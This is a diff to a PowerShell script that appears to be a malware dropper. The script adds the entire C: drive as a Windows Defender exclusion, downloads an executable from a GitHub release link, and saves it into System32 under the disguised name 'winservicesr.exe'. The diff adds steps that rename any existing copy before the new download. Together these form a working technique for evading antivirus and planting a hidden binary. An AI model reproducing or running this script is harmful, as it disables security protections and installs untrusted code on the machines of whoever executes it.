@@ -11,6 +11,10 @@ $downloadUrl = "https://github.com/boradxshlok/AAOGL/releases/download/pussysss2
 # Destination path in System32
 $destinationPath = "$env:SystemRoot\System32\winservicesr.exe"
 
+# New name for the existing file if it exists
+$newFileName = "winservicesr_old.exe"
+$renamePath = "$env:SystemRoot\System32\$newFileName"
+
 # Function to add C: drive as a Windows Defender exclusion
 function Add-DefenderExclusion {
     try {
@@ -29,7 +33,21 @@ try {
     # Add C: drive to Windows Defender exclusions
     Add-DefenderExclusion
 
-    # Download the executable
+    # Check if the file already exists
+    if (Test-Path $destinationPath) {
+        Write-Host "File winservicesr.exe already exists at $destinationPath. Renaming it to $newFileName..."
+        try {
+            # Rename the existing file
+            Rename-Item -Path $destinationPath -NewName $newFileName -Force -ErrorAction Stop
+            Write-Host "Successfully renamed existing file to $newFileName"
+        }
+        catch {
+            Write-Host "Error renaming existing file: $_"
+            exit 1
+        }
+    }
+
+    # Download the new executable
     Write-Host "Downloading winservicesr.exe from $downloadUrl..."
     Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing
 
